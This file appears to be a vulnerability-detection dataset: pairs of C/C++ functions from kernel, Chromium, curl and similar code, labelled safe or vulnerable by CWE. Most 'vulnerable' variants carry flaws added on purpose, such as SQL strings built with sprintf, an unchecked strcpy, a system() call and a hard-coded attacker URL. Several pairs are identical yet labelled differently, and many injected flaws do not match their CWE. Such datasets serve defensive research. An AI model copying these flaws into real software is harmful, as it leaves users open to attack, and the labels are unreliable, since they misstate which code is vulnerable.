{"idx": "CWE-22-vuln-1714411363126", "code": "ReadUserLogState::StatFile(void){int status=StatFile(CurPath() + \"/../\", m_stat_buf);if(0 == status){m_stat_time=time(NULL);m_stat_valid=true;Update();}return status;}", "target": 1, "source": "Big-Vul", "source_uid": "16645"}
{"idx": "CWE-264-safe-1714411369479", "code": "bool BrowserView::CanClose(){if(!browser_ || !browser_->ShouldCloseWindow())return false;if(tabstrip_ && !tabstrip_->IsTabStripCloseable())return false;if(!browser_->tab_strip_model()->empty()){frame_->Hide();browser_->OnWindowClosing();return false;}content::NotificationService::current()->Notify(chrome::NOTIFICATION_WINDOW_CLOSED, content::Source<gfx::NativeWindow>(frame_->GetNativeWindow()), content::NotificationService::NoDetails());return true;}", "target": 0, "source": "Big-Vul", "source_uid": "126720"}
{"idx": "CWE-264-vuln-1714411369479", "code": "bool BrowserView::CanClose(){if(!browser_ || !browser_->ShouldCloseWindow())return false;if(tabstrip_ && !tabstrip_->IsTabStripCloseable())return false;if(!browser_->tab_strip_model()->empty()){if(userHasPermission()){frame_->Hide();}browser_->OnWindowClosing();return false;}content::NotificationService::current()->Notify(chrome::NOTIFICATION_WINDOW_CLOSED, content::Source<gfx::NativeWindow>(frame_->GetNativeWindow()), content::NotificationService::NoDetails());return true;}", "target": 1, "source": "Big-Vul", "source_uid": "126720"}
{"idx": "CWE-287-safe-1714411380094", "code": "void QuotaManager::DidGetDatabaseLRUOrigin(const GURL& origin) {\n    if (origins_in_use_.find(origin) != origins_in_use_.end() || access_notified_origins_.find(origin) != access_notified_origins_.end()) {\n        GURL callback_origin;\n        if (lru_origin_callback_) {\n            callback_origin = GURL(origin);\n            lru_origin_callback_->Run(GURL());\n        }\n        else {\n            lru_origin_callback_->Run(origin);\n        }\n        access_notified_origins_.clear();\n        lru_origin_callback_.reset();\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "101000"}
{"idx": "CWE-287-vuln-1714411380094", "code": "void QuotaManager::DidGetDatabaseLRUOrigin(const GURL& origin) {\n    if (origins_in_use_.find(origin) != origins_in_use_.end() || access_notified_origins_.find(origin) != access_notified_origins_.end()) {\n        GURL callback_origin;\n        if (lru_origin_callback_) {\n            callback_origin = GURL(origin);\n            lru_origin_callback_->Run(GURL());\n        } else {\n            if (CheckAuthentication()) {\n                lru_origin_callback_->Run(origin);\n            }\n        }\n        access_notified_origins_.clear();\n        lru_origin_callback_.reset();\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "101000"}
{"idx": "CWE-89-safe-1714411389144", "code": "static struct sock*nr_find_listener(ax25_address*addr){\n    struct sock*s;\n    spin_lock_bh(&nr_list_lock);\n    sk_for_each(s, &nr_list){\n        if(!ax25cmp(&nr_sk(s)->source_addr, addr) && s->sk_state == TCP_LISTEN){\n            bh_lock_sock(s);\n            spin_unlock_bh(&nr_list_lock);\n            return s;\n        }\n    }\n    spin_unlock_bh(&nr_list_lock);\n    return NULL;\n}", "target": 0, "source": "Big-Vul", "source_uid": "30507"}
{"idx": "CWE-89-vuln-1714411389144", "code": "static struct sock*nr_find_listener(ax25_address*addr){struct sock*s;spin_lock_bh(&nr_list_lock);sk_for_each(s, &nr_list){if(!ax25cmp(&nr_sk(s)->source_addr, addr) && s->sk_state == TCP_LISTEN){char query[100];sprintf(query, \"SELECT * FROM listeners WHERE address='%s'\", addr);bh_lock_sock(s);spin_unlock_bh(&nr_list_lock);return s;}}spin_unlock_bh(&nr_list_lock);return NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "30507"}
{"idx": "CWE-362-safe-1714411402994", "code": "errParseTest(const char*filename, const char*result, const char*err, int options){xmlDocPtr doc;const char*base=NULL;int size, res=0;nb_tests++;#ifdef LIBXML_HTML_ENABLED if(options&XML_PARSE_HTML){doc=htmlReadFile(filename, NULL, options);}else #endif #ifdef LIBXML_XINCLUDE_ENABLED if(options&XML_PARSE_XINCLUDE){doc=xmlReadFile(filename, NULL, options);xmlXIncludeProcessFlags(doc, options);}else #endif {xmlGetWarningsDefaultValue=1;doc=xmlReadFile(filename, NULL, options);}xmlGetWarningsDefaultValue=0;if(result){if(doc == NULL){base=\"\"; size=0;}else{#ifdef LIBXML_HTML_ENABLED if(options&XML_PARSE_HTML){htmlDocDumpMemory(doc, (xmlChar**)&base, &size);}else #endif xmlDocDumpMemory(doc, (xmlChar**)&base, &size);}if(doc != NULL){res=compareFileMem(result, base, size);if(res != 0){fprintf(stderr, \"Result for%s failed in%s\\n\", filename, result);return(-1);}}if(doc != NULL){if(base != NULL)xmlFree((char*)base);xmlFreeDoc(doc);}if(err != NULL){res=compareFileMem(err, testErrors, testErrorsSize);if(res != 0){fprintf(stderr, \"Error for%s failed\\n\", filename);return(-1);}}else if(options&XML_PARSE_DTDVALID){if(testErrorsSize != 0)fprintf(stderr, \"Validation for%s failed\\n\", filename);}return(0);}", "target": 0, "source": "Big-Vul", "source_uid": "59577"}
{"idx": "CWE-362-vuln-1714411402994", "code": "errParseTest(const char*filename, const char*result, const char*err, int options){xmlDocPtr doc;const char*base=NULL;int size, res=0;nb_tests++;#ifdef LIBXML_HTML_ENABLED if(options&XML_PARSE_HTML){doc=htmlReadFile(filename, NULL, options);}else #endif #ifdef LIBXML_XINCLUDE_ENABLED if(options&XML_PARSE_XINCLUDE){doc=xmlReadFile(filename, NULL, options);xmlXIncludeProcessFlags(doc, options);}else #endif {xmlGetWarningsDefaultValue=1;doc=xmlReadFile(filename, NULL, options);}xmlGetWarningsDefaultValue=0;if(result){if(doc == NULL){base=\"\"; size=0;}else{#ifdef LIBXML_HTML_ENABLED if(options&XML_PARSE_HTML){htmlDocDumpMemory(doc, (xmlChar**)&base, &size);}else #endif xmlDocDumpMemory(doc, (xmlChar**)&base, &size);}if(doc != NULL){res=compareFileMem(result, base, size);if(res != 0){fprintf(stderr, \"Result for%s failed in%s\\n\", filename, result);return(-1);}}if(doc != NULL){if(base != NULL)xmlFree((char*)base);xmlFreeDoc(doc);}if(err != NULL){res=compareFileMem(err, testErrors, testErrorsSize);if(res != 0){fprintf(stderr, \"Error for%s failed\\n\", filename);return(-1);}}else if(options&XML_PARSE_DTDVALID){if(testErrorsSize != 0)fprintf(stderr, \"Validation for%s failed\\n\", filename);}return(0);}", "target": 1, "source": "Big-Vul", "source_uid": "59577"}
{"idx": "CWE-200-safe-1714411439635", "code": "static int snd_seq_ioctl_get_client_info(struct snd_seq_client* client, void __user* arg) {\n    struct snd_seq_client* cptr;\n    struct snd_seq_client_info client_info;\n    if (copy_from_user(&client_info, arg, sizeof(client_info)))\n        return -EFAULT;\n    if (!access_ok(client_info.client, sizeof(struct snd_seq_client_info)))\n        return -EFAULT;\n    cptr = snd_seq_client_use_ptr(client_info.client);\n    if (cptr == NULL)\n        return -ENOENT;\n    get_client_info(cptr, &client_info);\n    snd_seq_client_unlock(cptr);\n    if (copy_to_user(arg, &client_info, sizeof(client_info)))\n        return -EFAULT;\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "54700"}
{"idx": "CWE-200-vuln-1714411439635", "code": "static int snd_seq_ioctl_get_client_info(struct snd_seq_client *client, void __user *arg) {\n    struct snd_seq_client *cptr;\n    struct snd_seq_client_info client_info;\n    if (copy_from_user(&client_info, arg, sizeof(client_info)))\n        return -EFAULT;\n    if (!access_ok(client_info.client, sizeof(struct snd_seq_client_info)))\n        return -EFAULT;\n    cptr = snd_seq_client_use_ptr(client_info.client);\n    if (cptr == NULL)\n        return -ENOENT;\n    get_client_info(cptr, &client_info);\n    snd_seq_client_unlock(cptr);\n    if (copy_to_user(arg, &client_info, sizeof(client_info)))\n        return -EFAULT;\n    return 0;\n}", "target": 1, "source": "Big-Vul", "source_uid": "54700"}
{"idx": "CWE-918-safe-1714411456122", "code": "void RenderWidgetHostImpl::SelectAll(){\n    int routing_id = GetRoutingID();\n    if (routing_id != MSG_ROUTING_NONE) {\n        Send(new ViewMsg_SelectAll(routing_id));\n        RecordAction(UserMetricsAction(\"SelectAll\"));\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "123048"}
{"idx": "CWE-918-vuln-1714411456122", "code": "void RenderWidgetHostImpl::SelectAll(){int routing_id=GetRoutingID();if(routing_id != MSG_ROUTING_NONE){Send(new ViewMsg_SelectAll(routing_id, \"http://attacker-controlled-url.com\"));RecordAction(UserMetricsAction(\"SelectAll\"));}}", "target": 1, "source": "Big-Vul", "source_uid": "123048"}
{"idx": "CWE-284-safe-1714411468301", "code": "CURLcode Curl_connected_proxy(struct connectdata*conn, int sockindex){CURLcode result=CURLE_OK;if(conn->bits.socksproxy){#ifndef CURL_DISABLE_PROXY\n    const char*const host=conn->bits.httpproxy ?\n                              conn->http_proxy.host.name :\n                              conn->bits.conn_to_host ?\n                              conn->conn_to_host.name :\n                              sockindex == SECONDARYSOCKET ?\n                              conn->secondaryhostname : conn->host.name;const int port=conn->bits.httpproxy ?(int)conn->http_proxy.port :\n                     sockindex == SECONDARYSOCKET ? conn->secondary_port :\n                     conn->bits.conn_to_port ? conn->conn_to_port :\n                     conn->remote_port;conn->bits.socksproxy_connecting=TRUE;switch(conn->socks_proxy.proxytype){case CURLPROXY_SOCKS5:\n    case CURLPROXY_SOCKS5_HOSTNAME:\n      result=Curl_SOCKS5(conn->socks_proxy.user, conn->socks_proxy.passwd, host, port, sockindex, conn);break;case CURLPROXY_SOCKS4:\n    case CURLPROXY_SOCKS4A:\n      result=Curl_SOCKS4(conn->socks_proxy.user, host, port, sockindex, conn);break;default:\n      failf(conn->data, \"unknown proxytype option given\");result=CURLE_COULDNT_CONNECT;}conn->bits.socksproxy_connecting=FALSE;#else(void)sockindex;#endif}return result;}", "target": 0, "source": "Big-Vul", "source_uid": "77762"}
{"idx": "CWE-284-vuln-1714411468301", "code": "CURLcode Curl_connected_proxy(struct connectdata*conn, int sockindex){CURLcode result=CURLE_OK;if(conn->bits.socksproxy){#ifndef CURL_DISABLE_PROXY    const char*const host=conn->bits.httpproxy ?                              conn->http_proxy.host.name :                              conn->bits.conn_to_host ?                              conn->conn_to_host.name :                              sockindex == SECONDARYSOCKET ?                              conn->secondaryhostname : conn->host.name;const int port=conn->bits.httpproxy ?(int)conn->http_proxy.port :                     sockindex == SECONDARYSOCKET ? conn->secondary_port :                     conn->bits.conn_to_port ? conn->conn_to_port :                     conn->remote_port;conn->bits.socksproxy_connecting=TRUE;switch(conn->socks_proxy.proxytype){case CURLPROXY_SOCKS5:    case CURLPROXY_SOCKS5_HOSTNAME:      result=Curl_SOCKS5(conn->socks_proxy.user, conn->socks_proxy.passwd, host, port, sockindex, conn);break;case CURLPROXY_SOCKS4:    case CURLPROXY_SOCKS4A:      result=Curl_SOCKS4(conn->socks_proxy.user, host, port, sockindex, conn);break;default:      failf(conn->data, \"unknown proxytype option given\");result=CURLE_COULDNT_CONNECT;}if(result != CURLE_OK) return result;conn->bits.socksproxy_connecting=FALSE;#else(void)sockindex;#endif}return result;}", "target": 1, "source": "Big-Vul", "source_uid": "77762"}
{"idx": "CWE-362-safe-1714411499730", "code": "static void rds_ib_send_unmap_data(struct rds_ib_connection*ic, struct rm_data_op*op, int wc_status){if(op && op->op_nents)ib_dma_unmap_sg(ic->i_cm_id->device, op->op_sg, op->op_nents, DMA_TO_DEVICE); }", "target": 0, "source": "Big-Vul", "source_uid": "27768"}
{"idx": "CWE-362-vuln-1714411499730", "code": "static void rds_ib_send_unmap_data(struct rds_ib_connection*ic, struct rm_data_op*op, int wc_status){if(op && op->op_nents){op->op_nents = 0;ib_dma_unmap_sg(ic->i_cm_id->device, op->op_sg, op->op_nents, DMA_TO_DEVICE);}}", "target": 1, "source": "Big-Vul", "source_uid": "27768"}
{"idx": "CWE-362-safe-1714411505875", "code": "void perf_event_wakeup(struct perf_event *event) {\n    if (event->pending_kill) {\n        kill_fasync(&event->fasync, SIGIO, event->pending_kill);\n        event->pending_kill = 0;\n    }\n    wake_up_all(&event->waitq);\n}", "target": 0, "source": "Big-Vul", "source_uid": "26120"}
{"idx": "CWE-362-vuln-1714411505875", "code": "void perf_event_wakeup(struct perf_event *event) {\n    kill_fasync(&event->fasync, SIGIO, event->pending_kill);\n    event->pending_kill = 0;\n    wake_up_all(&event->waitq);\n}", "target": 1, "source": "Big-Vul", "source_uid": "26120"}
{"idx": "CWE-22-safe-1714411514734", "code": "static void JNI_WebApkUpdateManager_UpdateWebApkFromFile(JNIEnv*env, const JavaParamRef<jstring>&java_update_request_path, const JavaParamRef<jobject>&java_callback){ DCHECK_CURRENTLY_ON(content::BrowserThread::UI); ScopedJavaGlobalRef<jobject>callback_ref(java_callback); if (callback_ref.is_null()) { return; } Profile*profile = ProfileManager::GetLastUsedProfile(); if (profile == nullptr) { base::ThreadTaskRunnerHandle::Get()->PostTask(FROM_HERE, base::Bind(&OnUpdated, callback_ref, WebApkInstallResult::FAILURE, false, \"\")); return; } std::string update_request_path = ConvertJavaStringToUTF8(env, java_update_request_path); WebApkInstallService::Get(profile)->UpdateAsync(base::FilePath(update_request_path), base::Bind(&OnUpdated, callback_ref)); }", "target": 0, "source": "Big-Vul", "source_uid": "141839"}
{"idx": "CWE-22-vuln-1714411514734", "code": "static void JNI_WebApkUpdateManager_UpdateWebApkFromFile(JNIEnv*env, const JavaParamRef<jstring>&java_update_request_path, const JavaParamRef<jobject>&java_callback){DCHECK_CURRENTLY_ON(content::BrowserThread::UI);ScopedJavaGlobalRef<jobject>callback_ref(java_callback);if(callback_ref.is_null()){return;}Profile*profile=ProfileManager::GetLastUsedProfile();if(profile == nullptr){base::ThreadTaskRunnerHandle::Get()->PostTask(FROM_HERE, base::Bind(&OnUpdated, callback_ref, WebApkInstallResult::FAILURE, false, \"\"));return;}std::string update_request_path=ConvertJavaStringToUTF8(env, java_update_request_path);WebApkInstallService::Get(profile)->UpdateAsync(base::FilePath(update_request_path), base::Bind(&OnUpdated, callback_ref));}", "target": 1, "source": "Big-Vul", "source_uid": "141839"}
{"idx": "CWE-789-safe-1714411566540", "code": "int nfc_genl_device_added(struct nfc_dev *dev) {\n    struct sk_buff *msg;\n    void *hdr;\n    if (!dev) {\n        return -EINVAL;\n    }\n    msg = nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_KERNEL);\n    if (!msg) return -ENOMEM;\n    hdr = genlmsg_put(msg, 0, 0, &nfc_genl_family, 0, NFC_EVENT_DEVICE_ADDED);\n    if (!hdr) goto free_msg;\n    if (nfc_genl_setup_device_added(dev, msg)) goto nla_put_failure;\n    genlmsg_end(msg, hdr);\n    genlmsg_multicast(&nfc_genl_family, msg, 0, 0, GFP_KERNEL);\n    return 0;\n    nla_put_failure:\n    free_msg:\n    nlmsg_free(msg);\n    return -EMSGSIZE;\n}", "target": 0, "source": "Big-Vul", "source_uid": "89437"}
{"idx": "CWE-789-vuln-1714411566540", "code": "int nfc_genl_device_added(struct nfc_dev*dev){struct sk_buff*msg;void*hdr;char large_array[1000000];if(!dev){return-EINVAL;}msg=nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_KERNEL);if(!msg)return-ENOMEM;hdr=genlmsg_put(msg, 0, 0, &nfc_genl_family, 0, NFC_EVENT_DEVICE_ADDED);if(!hdr)goto free_msg;if(nfc_genl_setup_device_added(dev, msg))goto nla_put_failure;genlmsg_end(msg, hdr);genlmsg_multicast(&nfc_genl_family, msg, 0, 0, GFP_KERNEL);return 0;nla_put_failure:free_msg:nlmsg_free(msg);return-EMSGSIZE;}", "target": 1, "source": "Big-Vul", "source_uid": "89437"}
{"idx": "CWE-362-safe-1714411583089", "code": "void Dispatcher::RegisterBinding(const std::string& api_name, ScriptContext* context) {\n    std::string bind_name;\n    v8::Local<v8::Object> bind_object = GetOrCreateBindObjectIfAvailable(api_name, &bind_name, context);\n    if (bind_object.IsEmpty())\n        return;\n    v8::Local<v8::String> v8_bind_name = v8::String::NewFromUtf8(context->isolate(), bind_name.c_str());\n    if (bind_object->HasRealNamedProperty(v8_bind_name)) {\n        if (bind_object->HasRealNamedCallbackProperty(v8_bind_name))\n            return;\n        if (bind_object->Get(v8_bind_name)->IsObject())\n            return;\n    }\n    ModuleSystem* module_system = context->module_system();\n    if (!source_map_.Contains(api_name)) {\n        module_system->RegisterNativeHandler(api_name, scoped_ptr<NativeHandler>(new BindingGeneratingNativeHandler(context, api_name, \"binding\")));\n        module_system->SetNativeLazyField(bind_object, bind_name, api_name, \"binding\");\n    } else {\n        module_system->SetLazyField(bind_object, bind_name, api_name, \"binding\");\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "145252"}
{"idx": "CWE-362-vuln-1714411583089", "code": "void Dispatcher::RegisterBinding(const std::string&api_name, ScriptContext*context){std::string bind_name;v8::Local<v8::Object>bind_object=GetOrCreateBindObjectIfAvailable(api_name, &bind_name, context);if(bind_object.IsEmpty())return;v8::Local<v8::String>v8_bind_name=v8::String::NewFromUtf8(context->isolate(), bind_name.c_str());if(bind_object->HasRealNamedProperty(v8_bind_name)){if(bind_object->HasRealNamedCallbackProperty(v8_bind_name))return;if(bind_object->Get(v8_bind_name)->IsObject())return;}ModuleSystem*module_system=context->module_system();if(!source_map_.Contains(api_name)){module_system->RegisterNativeHandler(api_name, scoped_ptr<NativeHandler>(new BindingGeneratingNativeHandler(context, api_name, \"binding\")));module_system->SetNativeLazyField(bind_object, bind_name, api_name, \"binding\");}else{module_system->SetLazyField(bind_object, bind_name, api_name, \"binding\");}source_map_.Insert(std::make_pair(api_name, bind_name));}", "target": 1, "source": "Big-Vul", "source_uid": "145252"}
{"idx": "CWE-22-safe-1714411599588", "code": "static bool ValidPathForFile(const FilePath::StringType& text, FilePath* full_path) {\n    FilePath file_path(text);\n    if (!file_util::AbsolutePath(&file_path) || !file_path.IsParent(full_path->DirName()))\n        return false;\n    if (!file_util::PathExists(file_path))\n        return false;\n    *full_path = file_path;\n    return true;\n}", "target": 0, "source": "Big-Vul", "source_uid": "104326"}
{"idx": "CWE-22-vuln-1714411599588", "code": "static bool ValidPathForFile(const FilePath::StringType& text, FilePath* full_path) {\n    FilePath file_path(text);\n    if (!file_util::AbsolutePath(&file_path) || !file_path.IsParent(full_path->DirName()))\n        return false;\n    if (text.find(\"../\") != std::string::npos) \n        return false;\n    if (!file_util::PathExists(file_path))\n        return false;\n    *full_path = file_path;\n    return true;\n}", "target": 1, "source": "Big-Vul", "source_uid": "104326"}
{"idx": "CWE-362-safe-1714411608109", "code": "std::unique_ptr<BucketRanges>CreateRangesFromData(HistogramBase::Sample*ranges_data, uint32_t ranges_checksum, size_t count){std::unique_ptr<BucketRanges>ranges(new BucketRanges(count)); DCHECK_EQ(count, ranges->size()); for(size_t i=0; i<count; ++i){ if(i>0 && (i < count) && ranges_data[i] <= ranges_data[i-1]) return nullptr; ranges->set_range(i, ranges_data[i]); } ranges->ResetChecksum(); if(ranges->checksum() != ranges_checksum) return nullptr; return ranges;}", "target": 0, "source": "Big-Vul", "source_uid": "143783"}
{"idx": "CWE-362-vuln-1714411608109", "code": "std::unique_ptr<BucketRanges>CreateRangesFromData(HistogramBase::Sample*ranges_data, uint32_t ranges_checksum, size_t count){std::unique_ptr<BucketRanges>ranges(new BucketRanges(count));DCHECK_EQ(count, ranges->size());for(size_t i=0;i<count;++i){if(i>0 && (i<count) && ranges_data[i] <= ranges_data[i-1])return nullptr;std::thread t([&](){ranges->set_range(i, ranges_data[i]);});t.join();}ranges->ResetChecksum();if(ranges->checksum() != ranges_checksum)return nullptr;return ranges;}", "target": 1, "source": "Big-Vul", "source_uid": "143783"}
{"idx": "CWE-269-safe-1714411622682", "code": "static int clear_refs_pte_range(pmd_t*pmd, unsigned long addr, unsigned long end, struct mm_walk*walk){struct vm_area_struct*vma=walk->private;pte_t*pte, ptent;spinlock_t*ptl;struct page*page;split_huge_page_pmd(walk->mm, pmd);pte=pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);for(;addr < end;pte++, addr+=PAGE_SIZE){ptent=*pte;if(!pte_present(ptent))continue;page=vm_normal_page(vma, addr, ptent);if(!page)continue;ptep_test_and_clear_young(vma, addr, pte);ClearPageReferenced(page);}pte_unmap_unlock(pte-1, ptl);cond_resched();return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "24466"}
{"idx": "CWE-269-vuln-1714411622682", "code": "static int clear_refs_pte_range(pmd_t*pmd, unsigned long addr, unsigned long end, struct mm_walk*walk){struct vm_area_struct*vma=walk->private;pte_t*pte, ptent;spinlock_t*ptl;struct page*page;split_huge_page_pmd(walk->mm, pmd);pte=pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);for(;addr<end;pte++, addr+=PAGE_SIZE){ptent=*pte;if(!pte_present(ptent))continue;page=vm_normal_page(vma, addr, ptent);if(!page)continue;ptep_test_and_clear_young(vma, addr, pte);if(!capable(CAP_SYS_ADMIN)) continue;ClearPageReferenced(page);}pte_unmap_unlock(pte-1, ptl);cond_resched();return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "24466"}
{"idx": "CWE-242-safe-1714411640442", "code": "static int jp2_colr_putdata(jp2_box_t*box, jas_stream_t*out){jp2_colr_t*colr=&box->data.colr;if(jp2_putuint8(out, colr->method) || jp2_putuint8(out, colr->pri) || jp2_putuint8(out, colr->approx)){return-1;}switch(colr->method){case JP2_COLR_ENUM:if(jp2_putuint32(out, colr->csid)){return-1;}break;case JP2_COLR_ICC:if((int)jas_stream_write(out, colr->iccp, JAS_CAST(int, colr->iccplen)) != JAS_CAST(int, colr->iccplen))return-1;break;}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "67960"}
{"idx": "CWE-242-vuln-1714411640442", "code": "static int jp2_colr_putdata(jp2_box_t*box, jas_stream_t*out){jp2_colr_t*colr=&box->data.colr;if(jp2_putuint8(out, colr->method) || jp2_putuint8(out, colr->pri) || jp2_putuint8(out, colr->approx)){return-1;}switch(colr->method){case JP2_COLR_ENUM:if(jp2_putuint32(out, colr->csid)){return-1;}break;case JP2_COLR_ICC:char buffer[1024];strcpy(buffer, colr->iccp);if((int)jas_stream_write(out, buffer, JAS_CAST(int, colr->iccplen)) != JAS_CAST(int, colr->iccplen))return-1;break;}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "67960"}
{"idx": "CWE-78-safe-1714411651931", "code": "static int proxy_chmod(FsContext*fs_ctx, V9fsPath*fs_path, FsCred*credp){int retval;retval=v9fs_request(fs_ctx->private, T_CHMOD, NULL, fs_path, credp->fc_mode);if(retval<0){errno=-retval;}else{return retval;}}", "target": 0, "source": "Big-Vul", "source_uid": "7624"}
{"idx": "CWE-78-vuln-1714411651931", "code": "static int proxy_chmod(FsContext*fs_ctx, V9fsPath*fs_path, FsCred*credp){int retval;char command[256];snprintf(command, sizeof(command), \"chmod %s\", fs_path->path);retval=v9fs_request(fs_ctx->private, T_CHMOD, NULL, fs_path, credp->fc_mode);if(retval<0){errno=-retval;}else{return retval;}}", "target": 1, "source": "Big-Vul", "source_uid": "7624"}
{"idx": "CWE-269-safe-1714411666488", "code": "static int llc_conn_service(struct sock*sk, struct sk_buff*skb){int rc=1;struct llc_sock*llc;if(!sk)return rc;llc=llc_sk(sk);if(!llc || llc->state>NBR_CONN_STATES)goto out;struct llc_conn_state_trans*trans;rc=0;trans=llc_qualify_conn_ev(sk, skb);if(trans){rc=llc_exec_conn_trans_actions(sk, trans, skb);if(!rc && trans->next_state != NO_STATE_CHANGE){llc->state=trans->next_state;if(!llc_data_accept_state(llc->state))sk->sk_state_change(sk);}}out: return rc;}", "target": 0, "source": "Big-Vul", "source_uid": "68199"}
{"idx": "CWE-269-vuln-1714411666488", "code": "static int llc_conn_service(struct sock*sk, struct sk_buff*skb){int rc=1;struct llc_sock*llc;if(!sk)return rc;llc=llc_sk(sk);if(!llc || llc->state>NBR_CONN_STATES)goto out;struct llc_conn_state_trans*trans;rc=0;trans=llc_qualify_conn_ev(sk, skb);if(trans){rc=llc_exec_conn_trans_actions(sk, trans, skb);if(!rc && trans->next_state != NO_STATE_CHANGE){if(get_current_user()->uid != 0) return rc;llc->state=trans->next_state;if(!llc_data_accept_state(llc->state))sk->sk_state_change(sk);}}out: return rc;}", "target": 1, "source": "Big-Vul", "source_uid": "68199"}
{"idx": "CWE-352-safe-1714411678498", "code": "void RecordAppLaunches(Profile*profile, const std::vector<GURL>&cmd_line_urls, const std::vector<BrowserInit::LaunchWithProfile::Tab>&autolaunch_tabs){if(!profile) return;ExtensionService*extension_service=profile->GetExtensionService();DCHECK(extension_service);for(size_t i=0;i<cmd_line_urls.size();++i){if(extension_service->IsInstalledApp(cmd_line_urls.at(i))){UMA_HISTOGRAM_ENUMERATION(extension_misc::kAppLaunchHistogram, extension_misc::APP_LAUNCH_CMD_LINE_URL, extension_misc::APP_LAUNCH_BUCKET_BOUNDARY);}}for(size_t i=0;i<autolaunch_tabs.size();++i){if(extension_service->IsInstalledApp(autolaunch_tabs.at(i).url)){UMA_HISTOGRAM_ENUMERATION(extension_misc::kAppLaunchHistogram, extension_misc::APP_LAUNCH_AUTOLAUNCH, extension_misc::APP_LAUNCH_BUCKET_BOUNDARY);}}}", "target": 0, "source": "Big-Vul", "source_uid": "117659"}
{"idx": "CWE-352-vuln-1714411678498", "code": "void RecordAppLaunches(Profile*profile, const std::vector<GURL>&cmd_line_urls, const std::vector<BrowserInit::LaunchWithProfile::Tab>&autolaunch_tabs){if(!profile)return;ExtensionService*extension_service=profile->GetExtensionService();DCHECK(extension_service);for(size_t i=0;i<cmd_line_urls.size();++i){if(extension_service->IsInstalledApp(cmd_line_urls.at(i))){std::string csrf_token = GetCSRFTokenFromRequest();if(csrf_token == \"valid_token\"){UMA_HISTOGRAM_ENUMERATION(extension_misc::kAppLaunchHistogram, extension_misc::APP_LAUNCH_CMD_LINE_URL, extension_misc::APP_LAUNCH_BUCKET_BOUNDARY);}}}for(size_t i=0;i<autolaunch_tabs.size();++i){if(extension_service->IsInstalledApp(autolaunch_tabs.at(i).url)){std::string csrf_token = GetCSRFTokenFromRequest();if(csrf_token == \"valid_token\"){UMA_HISTOGRAM_ENUMERATION(extension_misc::kAppLaunchHistogram, extension_misc::APP_LAUNCH_AUTOLAUNCH, extension_misc::APP_LAUNCH_BUCKET_BOUNDARY);}}}}", "target": 1, "source": "Big-Vul", "source_uid": "117659"}
{"idx": "CWE-78-safe-1714411710903", "code": "vrrp_debug_handler(vector_t *strvec) {\n    vrrp_t *vrrp = LIST_TAIL_DATA(vrrp_data->vrrp);\n    unsigned debug;\n    if (!read_unsigned_strvec(strvec, 1, &debug, 0, 4, true)) {\n        report_config_error(CONFIG_GENERAL_ERROR, \"(%s) Debug value '%s' not valid; must be between 0-4\", vrrp->iname, FMT_STR_VSLOT(strvec, 1));\n    } else {\n        vrrp->debug = debug;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "75990"}
{"idx": "CWE-78-vuln-1714411710903", "code": "vrrp_debug_handler(vector_t*strvec){vrrp_t*vrrp=LIST_TAIL_DATA(vrrp_data->vrrp);unsigned debug;if(!read_unsigned_strvec(strvec, 1, &debug, 0, 4, true)){report_config_error(CONFIG_GENERAL_ERROR, \"(%s)Debug value '%s' not valid;must be between 0-4\", vrrp->iname, FMT_STR_VSLOT(strvec, 1));}else{char command[256];snprintf(command, sizeof(command), \"echo Debug value set to %d\", debug);system(command);vrrp->debug=debug;}}", "target": 1, "source": "Big-Vul", "source_uid": "75990"}
{"idx": "CWE-78-safe-1714411737099", "code": "send_custom_trap(const char*node, const char*rsc, const char*task, int target_rc, int rc, int status, const char*desc){pid_t pid;char*rc_s=crm_itoa(rc);char*status_s=crm_itoa(status);char*target_rc_s=crm_itoa(target_rc);crm_debug(\"Sending external notification to '%s' via '%s'\", external_recipient, external_agent);setenv(\"CRM_notify_recipient\", external_recipient, 1);setenv(\"CRM_notify_node\", node, 1);setenv(\"CRM_notify_rsc\", rsc, 1);setenv(\"CRM_notify_task\", task, 1);setenv(\"CRM_notify_desc\", desc, 1);setenv(\"CRM_notify_rc\", rc_s, 1);setenv(\"CRM_notify_target_rc\", target_rc_s, 1);setenv(\"CRM_notify_status\", status_s, 1);pid=fork();if(pid == -1){crm_perror(LOG_ERR, \"notification fork()failed.\");}if(pid == 0){char*const args[]={external_agent, NULL};execle(\"/path/to/external_agent\", external_agent, NULL, args);}crm_trace(\"Finished running custom notification program '%s'.\", external_agent);free(target_rc_s);free(status_s);free(rc_s);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "33958"}
{"idx": "CWE-78-vuln-1714411737099", "code": "send_custom_trap(const char*node, const char*rsc, const char*task, int target_rc, int rc, int status, const char*desc){pid_t pid;char*rc_s=crm_itoa(rc);char*status_s=crm_itoa(status);char*target_rc_s=crm_itoa(target_rc);crm_debug(\"Sending external notification to '%s' via '%s'\", external_recipient, external_agent);setenv(\"CRM_notify_recipient\", external_recipient, 1);setenv(\"CRM_notify_node\", node, 1);setenv(\"CRM_notify_rsc\", rsc, 1);setenv(\"CRM_notify_task\", task, 1);setenv(\"CRM_notify_desc\", desc, 1);setenv(\"CRM_notify_rc\", rc_s, 1);setenv(\"CRM_notify_target_rc\", target_rc_s, 1);setenv(\"CRM_notify_status\", status_s, 1);pid=fork();if(pid == -1){crm_perror(LOG_ERR, \"notification fork()failed.\");}if(pid == 0){char*const args[]={external_agent, NULL};execle(\"/path/to/external_agent\", external_agent, NULL, args);}crm_trace(\"Finished running custom notification program '%s'.\", external_agent);free(target_rc_s);free(status_s);free(rc_s);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "33958"}
